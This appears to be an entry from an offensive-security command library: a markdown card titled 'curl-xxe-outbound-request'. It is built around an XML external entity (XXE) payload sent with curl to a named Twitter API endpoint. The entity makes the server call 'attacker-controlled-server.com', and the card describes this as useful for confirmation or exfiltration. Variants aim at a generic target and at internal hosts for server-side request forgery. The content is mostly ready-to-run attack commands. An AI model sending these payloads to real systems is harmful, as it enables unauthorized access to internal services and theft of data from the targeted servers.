---
data: >-
  curl -X POST https://sms-be-vip.twitter.com/api/sxmp/1.0 -H 'Content-Type:
  application/xml' -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM
  "http://attacker-controlled-server.com/test">]><foo>&xxe;</foo>'
tags:
  - xxe
  - outbound-requests
type: command
executor: bash
platforms:
  - Linux
  - Web
id: 8c16d738-7f19-4891-9e38-5fbbd02eb36f
created_at: '2025-12-13T08:59:40.103Z'
updated_at: '2025-12-13T08:59:40.103Z'
verified: false
validated: true
submitted: true
---
# curl-xxe-outbound-request

## Command

```bash
curl -X POST https://sms-be-vip.twitter.com/api/sxmp/1.0 \
  -H 'Content-Type: application/xml' \
  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker-controlled-server.com/test">]><foo>&xxe;</foo>'
```

## Description

This command sends a POST request with an XXE payload that forces the server to make an outbound request to an external URL, useful for confirmation or exfiltration.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies the HTTP method | Yes |
| `-H 'Content-Type: application/xml'` | Sets the content type to XML | Yes |
| `-d 'xml_payload'` | The XML data with entity referencing external URL | Yes |

## Examples

### Basic Usage

```bash
curl -X POST https://target.com/api -H 'Content-Type: application/xml' -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://example.com">]><foo>&xxe;</foo>'
```

### Advanced Usage

```bash
curl -X POST https://target.com/api -H 'Content-Type: application/xml' -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://internal-host:port">]><foo>&xxe;</foo>'
```

## Expected Output

The server fetches the URL, potentially including its contents in the response or logging the request on the attacker's server.

## Related

- [[commands/curl-xxe-file-read]]
- [[procedures/Exploit-XXE-for-Outbound-Requests]]
